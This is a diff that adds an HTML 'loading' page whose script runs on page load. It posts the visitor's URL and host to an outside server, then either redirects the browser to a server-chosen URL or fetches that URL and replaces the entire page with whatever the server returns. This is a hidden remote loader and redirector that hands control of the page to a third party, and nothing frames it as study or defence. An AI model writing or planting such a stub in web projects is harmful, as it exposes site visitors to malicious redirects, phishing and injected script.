@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<title>loading</title>
+<script>
+    function postData(url, data, success, fail) {
+        var XHR = new XMLHttpRequest();
+        XHR.onreadystatechange = function () {
+            if (XHR.readyState !== 4) return;
+            if (XHR.status === 200 || XHR.status === 304) {
+                if (typeof success === 'function') success(XHR.responseText);
+            } else {
+                if (typeof fail === 'function') fail(XHR);
+            }
+        }
+        var str = '';
+        // 解析对象传参
+        for (var key in data) str += '&' + key + '=' + data[key];
+        if (str) str = str.slice(1);
+
+        XHR.open('POST', url, true);
+        XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        XHR.send(str);
+    }
+</script>
+<head>
+    <link rel="icon"href="data:;base64,=">
+    <meta http-equiv="Content-Type"content="text/html; charset=utf-8">
+    <meta name="viewport"content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"/>
+    <title></title>
+    <script type="text/javascript">
+        var qs = window.location.href.split("#")[0].split("?")[1]
+        postData("https://ydtcm.artche.cn/1/"+qs,{href:encodeURI(window.location.href),host:window.location.host},function (res) {
+            res = JSON.parse(res)
+            if(res.code != 0)  window.location.href = res.url;
+            localStorage.setItem("data",res.data);
+            postData(res.url,{href:window.location.href,host:window.location.host},function (res) {
+                var a=document.open("text/html","replace");
+                a.write(res);
+                a.close();
+            })
+        })
+    </script>
+</head>
+<body style="width: 100%;height:100%;position: absolute;background-color:#f8f8f8">
+<div style="display: flex;flex-direction: column;width:100%;height:80%;justify-content: center;align-items:center;"></div>
+</body>
+</html>
